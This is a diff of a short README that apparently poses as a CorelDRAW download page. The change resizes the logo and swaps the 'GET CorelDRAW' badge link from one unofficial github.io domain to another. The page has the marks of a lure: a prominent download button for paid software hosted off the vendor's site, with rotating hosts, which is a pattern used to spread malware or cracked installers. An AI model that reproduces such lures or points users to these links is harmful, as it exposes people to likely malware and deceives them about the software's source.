@@ -1,13 +1,13 @@
 # CorelDRAW – Complete Creative Suite for Vector Design and Illustration  
 
 <div align="center">  
-<img src="https://novedge.com/cdn/shop/files/coreldraw-graphics_d8ecb355-7e24-403a-a9bf-646e4d204ada_600x.png?v=1696402972" alt="CorelDRAW Logo" width="400">  
+<img src="https://novedge.com/cdn/shop/files/coreldraw-graphics_d8ecb355-7e24-403a-a9bf-646e4d204ada_600x.png?v=1696402972" alt="CorelDRAW Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/coreldraw">  
+<a href="https://install-quick-software.github.io/.github/coreldraw">  
 <img src="https://img.shields.io/badge/💻_GET_CorelDRAW-purple?style=for-the-badge&logo=apple" alt="GET CorelDRAW">  
 </a>  
 </div>
